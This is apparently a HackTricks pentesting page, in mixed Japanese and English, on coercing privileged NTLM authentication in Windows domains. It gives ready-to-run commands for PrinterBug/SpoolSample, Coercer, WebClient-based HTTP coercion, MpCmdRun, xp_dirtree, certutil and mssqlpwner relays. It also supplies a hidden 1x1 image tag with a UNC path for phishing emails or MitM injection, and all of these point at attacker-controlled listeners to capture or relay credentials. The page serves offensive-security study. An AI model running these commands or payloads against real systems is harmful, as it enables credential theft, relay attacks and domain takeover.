# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party dependencies を回避するために MIDL compiler を使用して C# で coded された **remote authentication triggers** の **collection** です。

## Spooler Service Abuse

_**Print Spooler**_ service が **enabled** の場合、既知の AD credentials を使用して、Domain Controller の print server に新しい print jobs の **update** を **request** し、その notification を **some system** に **send** するよう指示できます。\
printer が notification を任意の system に送信する場合、その system に対して **authenticate against** する必要があります。したがって、attacker は _**Print Spooler**_ service に任意の system に対して authenticate させることができ、この authentication では service が **computer account** を **use** します。

Under the hood では、classic な **PrinterBug** primitive は **`RpcRemoteFindFirstPrinterChangeNotificationEx`** を **`\\PIPE\\spoolss`** 経由で abuse します。attacker はまず printer/server handle を open し、次に `pszLocalMachine` に fake client name を指定します。これにより、target spooler は **attacker-controlled host** への notification channel を作成します。これが、その effect が direct code execution ではなく **outbound authentication coercion** になる理由です。<sup>[[2]](#references)</sup>\
spooler 自体の **RCE/LPE** を探している場合は、[PrintNightmare](printnightmare.md) を確認してください。この page は **coercion and relay** に focus しています。

### Finding Windows Servers on the domain

PowerShell を使用して、Windows boxes の list を取得します。Servers は通常 priority が高いため、そこに focus します:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### リッスンしている Spooler サービスの検出

@mysmartlogin（Vincent Le Toux）の [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を少し変更したものを使用して、Spooler Service がリッスンしているか確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux上で `rpcdump.py` を使用し、**MS-RPRN** protocol を探すこともできます：
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
または、Linuxから **NetExec/CrackMapExec** を使ってホストをすばやくテストします：
```bash
nxc smb targets.txt -u user -p password -M spooler
```
スプーラーエンドポイントが存在するかどうかを確認するだけでなく、**coercion surfaces** を列挙したい場合は、**Coercer scan mode** を使用します：<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
これは、EPM で endpoint が確認できても、print RPC interface が登録されていることしか分からないため有用です。現在の権限であらゆる coercion method に到達できることや、ホストが利用可能な authentication flow を発生させることまで保証されるわけではありません。

### サービスに任意のホストへの認証を要求する

[SpoolSampleはこちらから](https://github.com/NotMedic/NetNTLMtoSilverTicket) compile できます。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linuxを使用している場合は、[**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) または [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) を使用します。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer**を使用すると、spooler interfaceを直接標的にして、どのRPC methodが公開されているかを推測する必要をなくせます。<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClientでSMBではなくHTTPを強制する

Classic PrinterBugでは通常、`\\attacker\share` への **SMB** authenticationが発生します。これは依然として **capture**、**HTTP targetsへのrelay**、またはSMB signingが存在しない環境での **relay** に有用です。\
ただし、modern environmentsでは **SMB signing** によって **SMBからSMBへのrelay** が頻繁にブロックされるため、operatorsは代わりに **HTTP/WebDAV** authenticationを強制することを好みます。

targetで **WebClient** serviceが実行されている場合、Windowsが **WebDAV over HTTP** を使用する形式でlistenerを指定できます：
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
これは、**`ntlmrelayx --adcs`** やその他の HTTP relay targets と chaining する際に特に有用です。coerced connection で SMB relayability に依存せずに済むためです。重要な注意点として、HTTP/WebDAV variant を機能させるには、victim 上で **WebClient が実行中**でなければなりません。

### Unconstrained Delegation との組み合わせ

攻撃者がすでに [Unconstrained Delegation](unconstrained-delegation.md) が設定された computer を compromise している場合、攻撃者は **printer にこの computer に対して authenticate させる**ことができます。Unconstrained Delegation により、**printer の computer account の** **TGT** は、Unconstrained Delegation が設定された computer の **memory** に **保存されます**。攻撃者はすでにこの host を compromise しているため、**この ticket を取得**して abuse できます（[Pass the Ticket](pass-the-ticket.md)）。

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 同じ spooler pipe 上の asynchronous print interface。指定した host で到達可能な methods を列挙するには Coercer を使用します<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

注: これらの methods は、UNC path（例: `\\attacker\share`）を格納できる parameters を受け取ります。処理されると、Windows はその UNC に対して（machine/user context で）authenticate するため、NetNTLM の capture または relay が可能になります。\
spooler abuse では、protocol specification に `pszLocalMachine` で指定された client への notification channel を server が作成すると明記されているため、**MS-RPRN opnum 65** が引き続き最も一般的で、最も詳しく文書化された primitive です。<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target は指定された backup log path を open しようとし、attacker が control する UNC に authenticate します。<sup>[[1]](#references)</sup>
- Practical use: Tier 0 assets (DC/RODC/Citrix/etc.) に NetNTLM を emit させ、その後 AD CS endpoints (ESC8/ESC11 scenarios) またはその他の privileged services に relay します。<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack は、**Exchange Server の `PushSubscription` feature** に見つかった flaw の結果です。この feature により、mailbox を持つ任意の domain user が、Exchange server に HTTP 経由で任意の client-provided host に authenticate するよう強制できます。

デフォルトでは、**Exchange service は SYSTEM として実行**され、過剰な privileges（具体的には、**2019 Cumulative Update より前の domain に対する WriteDacl privileges**）が与えられています。この flaw を exploit すると、**LDAP への information の relaying**を有効にし、その後 domain NTDS database を extract できます。LDAP への relaying が不可能な場合でも、この flaw を使用して domain 内の他の hosts に relay し、authenticate することができます。この attack の exploit に成功すると、認証済みの domain user account だけで Domain Admin への即時 access が得られます。

## Inside Windows

すでに Windows machine 内にいる場合、以下を使用して、privileged accounts で Windows に server へ接続させることができます。

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
または、次の別の technique を使用します: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin（Microsoft が署名したバイナリ）を使用して、NTLM authentication を強制することが可能です:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### メール経由

侵害したいマシンにログインするユーザーの **email address** がわかっている場合、次のような **1x1 image** を含む **email** を送信するだけでよいでしょう。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
そして彼がそれを開くと、authenticate を試みます。

### MitM

コンピューターに対して MitM attack を実行し、相手が表示するページに HTML を挿入できる場合は、ページに次のような画像を挿入してみることができます。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authentication を force and phish するその他の方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 の Cracking

[NTLMv1 の challenge を capture できる場合は、こちらで crack 方法を確認してください](../ntlm/index.html#ntlmv1-attack)。\
_NTLMv1 を crack するには、Responder challenge を "1122334455667788" に設定する必要があることを忘れないでください_

## 参考資料

- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
